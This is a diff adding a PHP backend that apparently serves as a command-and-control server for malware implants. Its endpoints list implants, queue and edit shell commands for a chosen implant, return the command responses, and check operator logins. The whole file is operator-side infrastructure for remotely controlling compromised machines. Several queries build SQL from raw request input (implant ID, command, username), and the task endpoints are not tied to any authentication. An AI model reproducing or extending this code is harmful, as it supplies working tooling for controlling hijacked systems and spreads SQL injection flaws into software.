@@ -1,0 +1,170 @@
+<?php
+
+require_once 'db.php';
+
+header("Content-Type: application/json; charset=UTF-8");
+//header("Access-Control-Allow-Origin: *");
+//header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
+
+$parts = explode("/", $_SERVER["REQUEST_URI"]);
+
+if ($parts[1] != "api") {
+    http_response_code(404);
+    die();
+}
+
+
+// Function to recursively convert all strings to valid UTF-8
+function utf8ize($data) {
+    if (is_array($data)) {
+        foreach ($data as $k => $v) {
+            $data[$k] = utf8ize($v);
+        }
+        return $data;
+    } elseif (is_string($data)) {
+        return mb_convert_encoding($data, 'UTF-8', 'UTF-8'); // removes invalid sequences
+    } else {
+        return $data;
+    }
+}
+
+
+function main() {
+    global $parts, $pdo;
+
+    $method = $_SERVER["REQUEST_METHOD"];
+    switch ($method) {
+        case "GET":
+            switch ($parts[2]) {
+                case "implants":
+                    $stmt = $pdo->query("SELECT * FROM Implants");
+                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                    echo json_encode($results);
+                    break;
+                case "tasks":
+                    $implant_id = $parts[3] ?? null;
+                    if ($implant_id == null) {
+                        $stmt = $pdo->query("SELECT * FROM Tasks");
+                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                        $json = utf8ize($results);
+                        $json = json_encode($json, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR);
+                        if ($json === false) {
+                                echo "json_encode() failed: ".json_last_error_msg();
+                                var_dump(json_last_error());
+                        } else {
+                                echo $json;
+                        }
+                        break;
+                    } else {
+                        $stmt = $pdo->query("SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '$implant_id'");
+                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                        echo json_encode($results);
+                        break;
+                    }
+                default;
+                http_response_code(404);
+                die();
+            }
+            break;
+        case "PUT":
+            switch ($parts[2]) {
+            case "update_task":
+                $implant_id = $parts[4] ?? null;
+                $task_id = $parts[3] ?? null;
+                if ($task_id == null || $implant_id == null ) {
+                        http_response_code(404);
+                        die();
+                }
+                if (!isset($_POST['cmd'])) {
+                        http_response_code(304);
+                        die();
+                }
+                $cmd = $_POST['cmd'];
+                $stmt = $pdo->prepare("SELECT status FROM Tasks WHERE task_id = ?");
+                $stmt->execute([$task_id]);
+                $row = $stmt->fetch(PDO::FETCH_ASSOC);
+
+                if (!$row) {
+                    $reply->update = false;
+                    $reply->error = "Task not found.";
+                    echo json_encode($reply);
+                    exit;
+                }
+
+                if ($row['status'] != 0) {
+                    $reply->update = false;
+                    $reply->error = "Task cannot be modified (already completed).";
+                    echo json_encode($reply);
+                    exit;
+                }
+
+                // Step 2: Update command safely
+                $stmt = $pdo->prepare("UPDATE Tasks SET command = ? WHERE task_id = ?");
+                $stmt->execute([$cmd, $task_id]);
+
+                $reply->update = true;
+                echo json_encode($reply);
+                break;
+                default;
+                        http_response_code(404);
+                        die();
+            }
+            break;
+        case "POST":
+            switch ($parts[2]) {
+                case "new_task":
+                    $implant_id = $parts[3] ?? null;
+                    if ($implant_id == null) {
+                        // find suitable response code
+                        http_response_code(404);
+                        die();
+                    }
+                    if (!isset($_POST['cmd'])) {
+                        http_response_code(304);
+                        die();
+                    }
+                    $cmd = $_POST['cmd'];
+                    $stmt = $pdo->query("INSERT INTO Tasks (implant_id, command) VALUES ('$implant_id', '$cmd')");
+                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                    echo json_encode($results);
+                    break;
+
+                case "auth":
+                        if (!isset($_POST["Username"]) || !isset($_POST["Password"])) {
+                                die("Invalid Username or Password Field");
+                        }
+                        $username = $_POST['Username'] ?? "";
+                        $password = $_POST['Password'] ?? "";
+                        if (empty($username) || empty($password)) {
+                                $output = array("Authenticated" => false);
+                                echo json_encode($output);
+                                exit;
+                        }
+                        $stmt = $pdo->query("SELECT password FROM Operators WHERE username ='$username'");
+                        $result= $stmt->fetch(PDO::FETCH_ASSOC);
+                        
+                        if ($result && password_verify($password, $result['password'])) {
+                                $output = array("Authenticated" => true);
+                                echo json_encode($output);
+                                exit;
+                        }
+                        
+                        $output = array("Authenticated" => false);
+                        echo json_encode($output);
+                        exit;
+                    break;
+                default;
+                http_response_code(404);
+                die();
+                }
+                break;
+        case "DELETE":
+                break;
+        default:
+                http_response_code(404);
+                die();
+    }
+}
+
+main();
+?>
